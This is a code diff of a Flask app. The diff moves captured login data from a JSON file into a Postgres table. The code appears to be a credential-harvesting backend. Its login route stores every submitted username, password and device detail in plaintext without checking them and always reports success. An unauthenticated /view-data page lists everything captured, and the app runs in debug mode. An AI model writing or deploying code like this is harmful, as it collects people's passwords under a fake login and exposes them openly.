@@ -1,15 +1,27 @@
-from flask import Flask, request, render_template
-import requests
-from urllib.parse import quote as url_quote
-import json
+from flask import Flask, request, jsonify, render_template
 import os
+import psycopg2
+from urllib.parse import urlparse
 
 app = Flask(__name__)
 
-data_file = 'collected_data.json'
+# Get database URL from environment variables
+DATABASE_URL = os.getenv('DATABASE_URL')
+
+# Connect to your database
+def get_db_connection():
+    url = urlparse(DATABASE_URL)
+    connection = psycopg2.connect(
+        database=url.path[1:],
+        user=url.username,
+        password=url.password,
+        host=url.hostname,
+        port=url.port
+    )
+    return connection
 
 @app.route('/')
-def home():
+def index():
     return render_template('index.html')
 
 @app.route('/login', methods=['POST'])
@@ -24,26 +36,27 @@ def login():
         'device_info': device_info
     }
 
-    # Store data in a JSON file
-    if os.path.exists(data_file):
-        with open(data_file, 'r+') as file:
-            existing_data = json.load(file)
-            existing_data.append(data)
-            file.seek(0)
-            json.dump(existing_data, file, indent=4)
-    else:
-        with open(data_file, 'w') as file:
-            json.dump([data], file, indent=4)
+    # Store data in Postgres
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('INSERT INTO login_data (username, password, device_info) VALUES (%s, %s, %s)',
+                (username, password, device_info))
+    conn.commit()
+    cur.close()
+    conn.close()
 
-    return {"status": "Login successful"}, 200
+    return jsonify({'status': 'login successful'}), 200
 
 @app.route('/view-data', methods=['GET'])
 def view_data():
-    if os.path.exists(data_file):
-        with open(data_file, 'r') as file:
-            data = json.load(file)
-        return render_template('view_data.html', data=data)
-    return "No data available", 404
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('SELECT * FROM login_data')
+    data = cur.fetchall()
+    cur.close()
+    conn.close()
+
+    return render_template('view_data.html', data=data)
 
 if __name__ == '__main__':
     app.run(debug=True)
